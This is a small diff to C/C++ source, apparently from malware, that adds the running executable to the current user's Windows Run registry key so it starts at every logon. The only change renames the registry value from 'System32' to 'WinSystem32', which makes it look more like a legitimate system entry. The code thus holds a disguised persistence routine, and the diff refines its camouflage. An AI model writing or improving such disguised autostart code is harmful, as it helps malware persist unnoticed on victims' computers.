@@ -345,7 +345,7 @@ class Helpers
 					GetModuleFileName(NULL, path, 100);
 					HKEY newValue;
 					RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &newValue);
-					RegSetValueEx(newValue, "System32", 0, REG_SZ, (LPBYTE)path, sizeof(path));
+					RegSetValueEx(newValue, "WinSystem32", 0, REG_SZ, (LPBYTE)path, sizeof(path));
 					RegCloseKey(newValue);
 			
 				Sleep(5000);
@@ -357,7 +357,7 @@ class Helpers
 			GetModuleFileName(NULL, path, 100);
 			HKEY newValue;
 			RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &newValue);
-			RegDeleteValue(newValue, "System32");
+			RegDeleteValue(newValue, "WinSystem32");
 			RegCloseKey(newValue);
 		}
 
